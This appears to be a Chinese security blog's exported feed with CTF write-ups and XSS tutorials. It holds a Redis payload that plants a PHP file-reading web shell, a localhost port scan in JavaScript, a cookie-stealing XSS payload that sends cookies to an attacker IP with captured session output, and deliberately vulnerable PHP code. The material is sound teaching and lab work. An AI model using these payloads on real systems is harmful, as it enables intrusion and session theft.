-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask import Flask, request </span><br><span class="line"><span class="keyword">from</span> flask import render_template</span><br><span class="line">import os</span><br><span class="line">import uuid</span><br><span class="line">import tempfile</span><br><span class="line">import subprocess</span><br><span class="line">import time</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__ , static_url_path=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def proc_shell(cmd):</span><br><span class="line">    out_temp = tempfile.SpooledTemporaryFile(bufsize=<span class="number">1000</span>*<span class="number">1000</span>)</span><br><span class="line">    fileno = out_temp.fileno()</span><br><span class="line">    proc = subprocess.Popen(cmd, stderr=subprocess.PIPE, stdout=fileno, shell=<span class="literal">False</span>)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> proc.poll() == None:</span><br><span class="line">            <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">30</span>:</span><br><span class="line">                proc.terminate()</span><br><span class="line">                proc.kill()</span><br><span class="line">                proc.communicate()</span><br><span class="line">                out_temp.seek(<span class="number">0</span>)</span><br><span class="line">                out_temp.close()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            proc.communicate()</span><br><span class="line">            out_temp.seek(<span class="number">0</span>)</span><br><span class="line">            data = out_temp.read()</span><br><span class="line">            out_temp.close()</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">def casperjs_html(url):</span><br><span class="line">    cmd = <span class="string">&#x27;casperjs &#123;0&#125; --ignore-ssl-errors=yes --url=&#123;1&#125;&#x27;</span>.format(os.path.dirname(<span class="keyword">__file__</span>) + <span class="string">&#x27;/casper/casp.js&#x27;</span> ,url)</span><br><span class="line">    cmd = cmd.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    stdout = proc_shell(cmd)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = json.loads(stdout)</span><br><span class="line">        links = result.get(<span class="string">&#x27;resourceRequestUrls&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> links</span><br><span class="line">    except <span class="built_in">Exception</span>, e:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def index():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        filename = str(uuid.uuid1()) + <span class="string">&#x27;.html&#x27;</span></span><br><span class="line">        basepath = os.path.dirname(<span class="keyword">__file__</span>)</span><br><span class="line">        upload_path = os.path.join(basepath, <span class="string">&#x27;static/upload/&#x27;</span>, filename)</span><br><span class="line">        content = f.read()</span><br><span class="line">        <span class="comment">#hint</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;level=low_273eac1c&#x27;</span> not in content <span class="keyword">and</span> <span class="string">&#x27;dbfilename&#x27;</span> in content.lower():</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, msg=u<span class="string">&#x27;Warning: 发现恶意关键字&#x27;</span>)</span><br><span class="line">        <span class="comment">#hint</span></span><br><span class="line">        with open(upload_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(content)</span><br><span class="line">        url = <span class="string">&#x27;http://127.0.0.1:80/upload/&#x27;</span>+filename</span><br><span class="line">        links = casperjs_html(url)</span><br><span class="line">        links = <span class="string">&#x27;\n&#x27;</span>.join(links)</span><br><span class="line">        <span class="keyword">if</span> not links:</span><br><span class="line">            links = <span class="string">&#x27;NULL&#x27;</span></span><br><span class="line">        links = <span class="string">&#x27;URL: &#x27;</span>+url+<span class="string">&#x27;\n&#x27;</span>+links</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, links=links)</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/get_sourcecode&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def get_code():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        <span class="keyword">if</span> ip != <span class="string">&#x27;127.0.0.1&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;NOT 127.0.0.1&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            with open(os.path.dirname(<span class="keyword">__file__</span>)+<span class="string">&#x27;/run.py&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                code = f.read()</span><br><span class="line">            <span class="keyword">return</span> code</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">@app.errorhandler(<span class="number">404</span>)</span><br><span class="line">def page_not_found(<span class="built_in">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;404&#x27;</span></span><br><span class="line"></span><br><span class="line">@app.errorhandler(<span class="number">500</span>)</span><br><span class="line">def internal_server_error(<span class="built_in">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;500&#x27;</span></span><br><span class="line"></span><br><span class="line">@app.errorhandler(<span class="number">403</span>)</span><br><span class="line">def unauthorized(<span class="built_in">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;403&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pass</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是我也没看出什么来。。。<br>比赛当时，我就做到这。接下来是表哥的操作了。。。</p><hr><p>可以用同样的方法得到服务器端口，代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a id&#x3D;&quot;result&quot;&gt;&lt;&#x2F;a&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var data &#x3D; document.getElementById(&#39;result&#39;).innerHTML;</span><br><span class="line">var TagName &#x3D; document.getElementsByTagName(&quot;body&quot;)[0];</span><br><span class="line">ports&#x3D;[80,81,88,6379,8000,8080,8088];</span><br><span class="line">for(var i in ports)&#123;</span><br><span class="line">    var script &#x3D;   document.createElement(&quot;script&quot;);</span><br><span class="line">    poc &#x3D; &quot;data +&#x3D; &#39;&quot; + ports[i] + &quot; OPEN; &#39;; document.getElementById(&#39;result&#39;).innerHTML &#x3D; data;&quot;</span><br><span class="line">    script.setAttribute(&quot;src&quot;,&quot;http:&#x2F;&#x2F;127.0.0.1:&quot; + ports[i]);</span><br><span class="line">    script.setAttribute(&quot;onload&quot;, poc);</span><br><span class="line">    TagName.appendChild(script);</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180821/c3lg0fLLDa.png?imageslim" alt="mark"></p><p>得到8000端口开放着，猜测是apache2等phpserver</p><p>构造一个Redis EXP。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&quot; id&#x3D;&quot;flag&quot;&gt;test&lt;&#x2F;a&gt;</span><br><span class="line">level&#x3D;low_273eac1c</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var xmlHttp;</span><br><span class="line">if(window.XMLHttpRequest)&#123;</span><br><span class="line">    xmlHttp &#x3D; new XMLHttpRequest();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    xmlHttp &#x3D; newActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var formData &#x3D; new FormData();</span><br><span class="line">formData.append(&quot;0&quot;,&quot;flushall&quot;+&quot;\n&quot;+&quot;config set dir &#x2F;var&#x2F;www&#x2F;html&#x2F;&quot;+&quot;\n&quot;+&quot;config set dbfilename shell.php&quot;+&quot;\n&quot;+&#39;set 1 &quot;\n\n&lt;?php header(\&#39;Access-Control-Allow-Origin:*\&#39;); echo file_get_contents($_GET[_]);?&gt;\n\n&quot;&#39;+&quot;\n&quot;+&quot;save&quot;+&quot;\n&quot;+&quot;quit&quot;);</span><br><span class="line">xmlHttp.open(&quot;POST&quot;,&quot;http:&#x2F;&#x2F;127.0.0.1:6379&quot;,true);</span><br><span class="line">xmlHttp.send(formData);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>因为不同端口，所以存在跨域，需要加上Access-Control-Allow-Origin:* 头部。（或者直接PHP反弹SHELL也可以）然后再构造一个HTML。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&quot; id&#x3D;&quot;flag&quot;&gt;test&lt;&#x2F;a&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">function loadXMLDoc()&#123;</span><br><span class="line">    var xmlhttp;</span><br><span class="line">    if (window.XMLHttpRequest)&#123;&#x2F;&#x2F; code for IE7+, Firefox, Chrome, Opera, Safari</span><br><span class="line">        xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;&#x2F;&#x2F; code for IE6, IE5</span><br><span class="line">        xmlhttp&#x3D;new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.onreadystatechange&#x3D;function()&#123;</span><br><span class="line">        if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200)</span><br><span class="line">        &#123;</span><br><span class="line">            document.getElementById(&quot;flag&quot;).innerHTML&#x3D;xmlhttp.responseText;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.open(&quot;GET&quot;,&quot;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;shell.php?_&#x3D;flag.php&quot;,true);</span><br><span class="line">    xmlhttp.send();</span><br><span class="line">&#125;</span><br><span class="line">loadXMLDoc();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>但是我没有获得flag，所以还需要研究。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://paper.tuisec.win/detail/2c0e5b0dbec3a78">2018网鼎杯Web题解</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzUzNTkyODI0OA==&mid=2247491146&idx=3&sn=62911c7eede3f3207bd3badb65983d8d&chksm=faff529dcd88db8b00fc09b58bd8d86ebbbd6463cba8d9319718e4ded7046fc60c76475aa943&mpshare=1&scene=23&srcid=0820KKS4SsULFtWOy9z1xffV#rd">i春秋微信公众号-网鼎杯第一场spider题详细writeup </a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 隐写术 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> 取证分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS攻击手段&amp;在CTF中的运用</title>
      <link href="/2018/08/18/XSS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5&amp;%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/"/>
      <url>/2018/08/18/XSS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5&amp;%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS攻击手段-amp-在CTF中的运用"><a href="#XSS攻击手段-amp-在CTF中的运用" class="headerlink" title="XSS攻击手段&amp;在CTF中的运用"></a>XSS攻击手段&amp;在CTF中的运用</h1><p>前文说完了XSS的原理，下面记录一下学习到的<strong>XSS的攻击手段和XSS在CTF中的运用</strong>。<br>如有不当之处，缺漏之处，望师傅联系斧正。</p><h1 id="初探XSS-Payload"><a href="#初探XSS-Payload" class="headerlink" title="初探XSS Payload"></a>初探XSS Payload</h1><p>前文谈到了XSS的几种分类。接下来，就从攻击的角度来体验一下xss的威力。<br>XSS攻击成功后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，<br>控制用户的浏览器。这些用以完成各种具体功能的恶意脚本，被称为<strong>XSS Payload</strong>.</p><p><code>XSS Payload</code> 实际上就是<code>JavaScript</code>脚本(还可以是Flash 或其他富客户端的脚本)<br>所以任何<code>JavaScript</code>脚本能实现的功能，<code>XSS Payload</code>都能做到。<br>一个最常见的 <code>XSS Payload</code>,就是通过读取浏览器的<code>Cookie</code>对象，从而发起<strong>Cookie劫持</strong>攻击。</p><p>同样的还有很多攻击方式，再如查看浏览器历史记录，访问劫持等等。</p><h2 id="盗用cookie"><a href="#盗用cookie" class="headerlink" title="盗用cookie"></a>盗用cookie</h2><h3 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h3><p>Cookie一般加密保存了用户的登陆凭证。Cookie 如果丢失了，往往意味着用户的登陆凭证丢失。换句话说，攻击者可以不通过密码，而直接进入用户的账户。</p><p>Cookie盗取Payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;var img&#x3D;document.createElement(&quot;img&quot;);img.src&#x3D;&quot;http:&#x2F;&#x2F;192.168.118.138:1234&#x2F;a?&quot;+escape(document.cookie);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>以DVWA为例，DOM型XSS<code>http://localhost/dvwa/vulnerabilities/xss_d/?default=&lt;script&gt;alert(v0w)&lt;/script&gt;</code></p><p>在kali上nc监听端口1234</p><pre><code>nc -nvlp 1234</code></pre><p>构造Cookie劫持的<code>XSS Payload</code>:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;dvwa&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;&lt;script&gt;var img&#x3D;document.createElement(&quot;img&quot;);img.src&#x3D;&quot;http:&#x2F;&#x2F;192.168.118.138:1234&#x2F;a?&quot;+escape(document.cookie);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>kali上接收到数据包</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# nc -nvlp 1234</span><br><span class="line">listening on [any] 1234 ...</span><br><span class="line">connect to [192.168.118.138] from (UNKNOWN) [192.168.118.1] 49597</span><br><span class="line">GET &#x2F;a?security%3Dlow%3B%20PHPSESSID%3Do58bsvrlfbval38fs1l3gubr16 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.118.138:1234</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko&#x2F;20100101 Firefox&#x2F;55.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;localhost&#x2F;dvwa&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;%3Cscript%3Evar%20img&#x3D;document.createElement(%22img%22);img.src&#x3D;%22http:&#x2F;&#x2F;192.168.118.138:1234&#x2F;a?%22+escape(document.cookie);%3C&#x2F;script%3E</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中，参数a后面的就是Cookie。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">security&#x3D;low; PHPSESSID&#x3D;o58bsvrlfbval38fs1l3gubr16</span><br></pre></td></tr></table></figure><p>与浏览器上的Cookie一致。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180819/h3HAgmdLkA.png?imageslim" alt="mark"><br>有了这个Cookie，我们可以在不知道密码的情况下，登陆该用户的账户：</p><ol><li>打开另一个浏览器，并没有登陆</li><li>从抓到的包，可以看出链接地址，直接进入<code>http://localhost/dvwa/vulnerabilities/xss_d/</code>,发现进不去，需要登陆。</li><li>set-Cookie：security=low; PHPSESSID=o58bsvrlfbval38fs1l3gubr16</li><li>再次访问链接<code>http://localhost/dvwa/vulnerabilities/xss_d/</code>,发现可以进入了，账户身份正是盗取的用户身份。</li></ol><h3 id="防护手段"><a href="#防护手段" class="headerlink" title="防护手段"></a>防护手段</h3><ul><li>HttpOnly</li><li>Cookie与IP地址绑定</li></ul><h2 id="XSS构造GET-amp-POST请求"><a href="#XSS构造GET-amp-POST请求" class="headerlink" title="XSS构造GET&amp;POST请求"></a>XSS构造GET&amp;POST请求</h2><p>对网站的浏览和操作，大部分都可以通过GET请求和POST请求来完成，因此可以通过js构造<code>XSS Payload</code>以完成一系列操作。</p><p>如可以通过一个url可以删除文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;do&#x2F;?m&#x3D;delete&amp;id&#x3D;123</span><br></pre></td></tr></table></figure><p>攻击者可以通过构造<code>XSS Payload</code>,发起这个请求：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var img &#x3D; docunment.createElement(&quot;img&quot;);</span><br><span class="line">img.src &#x3D; &quot;http:&#x2F;&#x2F;www.example.com&#x2F;do&#x2F;?m&#x3D;delete&amp;id&#x3D;123&quot;;</span><br><span class="line">document.body.appendChild(img);</span><br></pre></td></tr></table></figure><p>同样的道理，甚至可以利用<code>XSS Payload</code> 读取用户邮箱的邮件。</p><h2 id="XSS钓鱼盗取账户密码"><a href="#XSS钓鱼盗取账户密码" class="headerlink" title="XSS钓鱼盗取账户密码"></a>XSS钓鱼盗取账户密码</h2><p>思路：利用js在页面上画出一个伪造的登录框，当用户输入完成时，发送账密到攻击者服务器。</p><h2 id="劫持访问"><a href="#劫持访问" class="headerlink" title="劫持访问"></a>劫持访问</h2><p>构造<code>XSSPayload</code>可以将用户浏览，重定向到指定链接。和GET，POST类似</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;window.location.href&#x3D;&quot;http:&#x2F;&#x2F;www.baidu.com&quot;; &lt;&#x2F;script&gt;</span><br><span class="line">或者</span><br><span class="line">%3Cscript%3Ewindow.location.href&#x3D;%22http:&#x2F;&#x2F;www.baidu.com%22;%20%3C&#x2F;script%3E   </span><br></pre></td></tr></table></figure><h2 id="识别用户浏览器"><a href="#识别用户浏览器" class="headerlink" title="识别用户浏览器"></a>识别用户浏览器</h2><p>简单的一行代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert(navigator.userAgent)</span><br></pre></td></tr></table></figure><p>还可以加入更加复杂的判断，更精确的识别浏览器。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180823/79dgCb0E0f.png?imageslim" alt="mark"></p><h2 id="网页挂马"><a href="#网页挂马" class="headerlink" title="网页挂马"></a>网页挂马</h2><p>一般都是通过篡改网页的方式来实现的，如在 XSS 中使用 <code>&lt;iframe&gt;</code> 标签。</p><h2 id="DOS-与-DDOS"><a href="#DOS-与-DDOS" class="headerlink" title="DOS 与 DDOS"></a>DOS 与 DDOS</h2><p>注入恶意 JavaScript 代码，可能会引起一些拒绝服务攻击。</p><h2 id="XSS-蠕虫"><a href="#XSS-蠕虫" class="headerlink" title="XSS 蠕虫"></a>XSS 蠕虫</h2><p>通过精心构造的 XSS 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。</p><h1 id="XSS在CTF中的运用"><a href="#XSS在CTF中的运用" class="headerlink" title="XSS在CTF中的运用"></a>XSS在CTF中的运用</h1><p>XSS在CTF中主要用于盗取<code>Cookie</code>和<code>Session</code>，然后利用<code>cookie</code>,做一些其他的事情，但是这是有CSP的，一般会考察<code>XSS绕过(bypass)</code>的能力。</p><p>另外还会涉及到<code>XSS</code>,<code>CSRF</code>，<code>SSRF</code>的综合应用。</p><p>再者，就是利用XSS漏洞，进行js脚本注入。这类利用更加灵活，难度也更大一些。</p><hr><p>未完，待续。。。</p><p>在CTF中的运用，还没写完，需要在积累一定题量和总结的基础上，举例说明。。。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="http://blog.knownsec.com/2018/04/tctf0ctf2018-xss-writeup/">TCTF/0CTF2018 XSS Writeup</a></li><li><a href="http://blog.neargle.com/2017/09/01/ddctf-web-xss-sqli-writeup/">ddctf 两道web题的Writeup (sqli &amp; xss)</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/web/xss/">wiki-XSS 跨站脚本攻击</a></li><li>道哥的 《白帽子讲web安全》</li><li><a href="https://zhuanlan.zhihu.com/p/35468874">JavaScript 与 XSS 与 CSRF</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS漏洞原理&amp;复现</title>
      <link href="/2018/08/16/XSS%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/"/>
      <url>/2018/08/16/XSS%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS原理-amp-复现"><a href="#XSS原理-amp-复现" class="headerlink" title="XSS原理&amp;复现"></a>XSS原理&amp;复现</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前也学习和总结过XSS，但是由于当时能力有限，理解不是透彻，还有很多骚姿势，都没看懂，现在因为遇到几个XSS的题目，并且有了新的理解，遂总结一下<strong>XSS原理&amp;复现</strong>，之后还将总结<strong>XSS攻击手段&amp;在CTF中的运用</strong>以及<strong>XSS的绕过姿势</strong>。</p><h1 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h1><p>CSS（Cross Site Scripting，跨站脚本攻击），为了和层叠样式表（Cascading Style Sheet，CSS）区分，所以安全领域改为叫XSS。<br>XSS攻击能让攻击者在受害者的浏览器中执行js脚本，并劫持用户会话、破坏网络或将用户重定向到其他恶意的站点。</p><h1 id="XSS的分类"><a href="#XSS的分类" class="headerlink" title="XSS的分类"></a>XSS的分类</h1><h2 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1. 反射型XSS"></a>1. 反射型XSS</h2><p>所谓反射型XSS，就是简单的吧用户输入的数据‘反射’给浏览器。也就是说，黑客我那个网需要有事用户‘点击’一个恶意链接，才能攻击。这其实是比较被动的。</p><h2 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2. 存储型XSS"></a>2. 存储型XSS</h2><p>存储型XSS会把用户输入的数据‘存储’在服务器端。当访问数据库数据时，从数据库取出数据，并由HTML显示，这时导致了XSS的产生。</p><p>比如黑客将恶意js脚本写在一个博客中，下次任何人访问这个博客，都会在他们的浏览器中执行这段恶意js脚本。导致‘Cookie劫持’等。</p><h2 id="3-DOM型XSS"><a href="#3-DOM型XSS" class="headerlink" title="3. DOM型XSS"></a>3. DOM型XSS</h2><p><strong>首先是关于DOM节点：</strong><br>整个文档是一个文档节点 从每个 XML 标签是一个元素节点 包含在 XML 元素中的文本是文本节点 每一个 XML 属性是一个属性节点 注释属于注释节点。</p><p>HTML 文档中的所有内容都是节点：</p><ul><li>整个文档是一个文档节点</li><li>每个 HTML 元素是元素节点</li><li>HTML 元素内的文本是文本节点</li><li>每个 HTML 属性是属性节点</li><li>注释是注释节点</li></ul><p>和反射型XSS类似，但是这类XSS执行脚本的位置与反射型XSS不同，是修改了页面的DOM节点而造成了恶意js脚本的执行。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><table><thead><tr><th>XSS类型</th><th>反射型</th><th>存储型</th><th>DOM型</th></tr></thead><tbody><tr><td>触发过程</td><td>正常用户访问携带XSS的url</td><td>1.黑客构造XSS脚本</br> 2.用户访问有XSS脚本的网站</td><td>正常用户访问携带XSS的url</td></tr><tr><td>存储位置</td><td>url</td><td>数据库</td><td>url</td></tr><tr><td>谁来输出</td><td>后端web</td><td>后端web</td><td>前端JS</td></tr><tr><td>输出位置</td><td>HTML响应</td><td>HTML响应</td><td>动态生成的DOM节点</td></tr></tbody></table><h1 id="简单复现"><a href="#简单复现" class="headerlink" title="简单复现"></a>简单复现</h1><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;title&gt;XSS原理重现&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xss_input&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;&lt;&#x2F;form&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$xss &#x3D; @$_GET[&#39;xss_input&#39;];</span><br><span class="line">echo &quot;your input:&quot;.$xss.&quot;\n&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>很简单的功能，输入数据，返回数据<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180819/eHdmcaf9LC.png?imageslim" alt="mark"></p><p>但是，如果输入的数据是XSS攻击语句，就会造成弹窗等问题</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180819/4D688EImKg.png?imageslim" alt="mark"><br>看一下源码，发现XSS语句已经嵌入到html中。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;title&gt;XSS原理重现&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xss_input&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;&lt;&#x2F;form&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">your input:&lt;script&gt;alert(&#39;xsss&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>复现代码xss_save.php</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;title&gt;存储型XSS重现&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;id&quot; value&#x3D;&quot;id&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xss_input&quot; value&#x3D;&quot;text&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;&lt;&#x2F;form&gt;</span><br><span class="line">&lt;hr&gt;&lt;!--分割线--&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$id &#x3D; @$_GET[&#39;id&#39;];</span><br><span class="line">$xss &#x3D; @$_GET[&#39;xss_input&#39;];</span><br><span class="line">mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;meimima123&quot;);</span><br><span class="line">mysql_select_db(&quot;test&quot;);</span><br><span class="line">if($xss !&#x3D;&#x3D; null)&#123;</span><br><span class="line">$sql &#x3D; &quot;insert into xss(id,text)values(&#39;$id&#39;,&#39;$xss&#39;)&quot;;</span><br><span class="line">$result &#x3D; mysql_query($sql);</span><br><span class="line">echo $result;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span 